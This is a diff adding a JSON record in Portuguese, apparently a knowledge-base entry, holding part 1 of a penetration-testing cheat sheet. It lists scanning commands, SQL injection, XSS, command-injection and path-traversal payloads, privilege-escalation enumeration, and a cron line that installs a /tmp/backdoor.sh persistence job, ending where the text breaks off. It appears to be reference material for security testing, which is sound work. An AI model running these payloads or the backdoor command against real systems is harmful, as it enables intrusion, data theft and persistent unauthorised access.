@@ -1,0 +1,13 @@
+{
+  "id": "Penetration_Testing_Advanced_0_2026-05-07T14:35:24.361014",
+  "titulo": "Penetration Testing Advanced - Parte 1/4",
+  "conteudo": "# PENETRATION TESTING - CONHECIMENTO AVANÇADO\n\n## METODOLOGIA OWASP\n\n### 1. RECONNAISSANCE (Reconhecimento)\n**Técnicas:**\n- Passive Information Gathering (OSINT)\n- Active Scanning (Nmap, Masscan)\n- DNS Enumeration (dig, nslookup, dnsenum)\n- Subdomain Discovery (Sublist3r, Amass)\n- WHOIS Lookup\n- Google Dorking\n\n**Comandos essenciais:**\n```bash\nnmap -sV -sC -p- target.com\nmasscan -p1-65535 target.com --rate=1000\ndnsenum target.com\namass enum -d target.com\n```\n\n### 2. SCANNING & ENUMERATION\n**Port Scanning:**\n- TCP Connect Scan: nmap -sT\n- SYN Stealth Scan: nmap -sS\n- UDP Scan: nmap -sU\n- Service Version Detection: nmap -sV\n\n**Vulnerability Scanning:**\n- Nessus, OpenVAS, Nikto\n- Web scanners: Burp Suite, ZAP\n- SSL/TLS: testssl.sh, sslyze\n\n### 3. EXPLOITATION\n**Common Vulnerabilities:**\n\n**SQL Injection:**\n```sql\n' OR '1'='1' --\n' UNION SELECT NULL,NULL,NULL--\n' AND 1=CONVERT(int, (SELECT @@version))--\n```\n\n**XSS (Cross-Site Scripting):**\n```html\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n```\n\n**Command Injection:**\n```bash\n; cat /etc/passwd\n| whoami\n&& id\n`ls -la`\n```\n\n**Path Traversal:**\n```\n../../etc/passwd\n....//....//etc/passwd\n..%2f..%2fetc%2fpasswd\n```\n\n### 4. POST-EXPLOITATION\n**Privilege Escalation Linux:**\n```bash\n# SUID binaries\nfind / -perm -4000 2>/dev/null\n\n# Capabilities\ngetcap -r / 2>/dev/null\n\n# Sudo misconfigurations\nsudo -l\n\n# Kernel exploits\nuname -a\nsearchsploit linux kernel\n```\n\n**Privilege Escalation Windows:**\n```powershell\n# Unquoted service paths\nwmic service get name,pathname\n\n# Always Install Elevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\n# Weak service permissions\naccesschk.exe -uwcqv *\n\n# Token impersonation\nwhoami /priv\n```\n\n**Lateral Movement:**\n- Pass-the-Hash (Mimikatz)\n- Kerberoasting\n- Golden/Silver Ticket\n- PSExec, WMI, WinRM\n- SSH Key stealing\n\n### 5. PERSISTENCE TECHNIQUES\n**Linux:**\n```bash\n# Cron jobs\necho \"*/5 * * * * /tmp/backdoor.sh\" | crontab -\n\n",
+  "tags": [
+    "pentest",
+    "hacking",
+    "nmap"
+  ],
+  "fonte": "Penetration Testing Advanced",
+  "tipo": "conhecimento_tecnico_cybersecurity",
+  "criado_em": "2026-05-07T14:35:24.361026"
+}
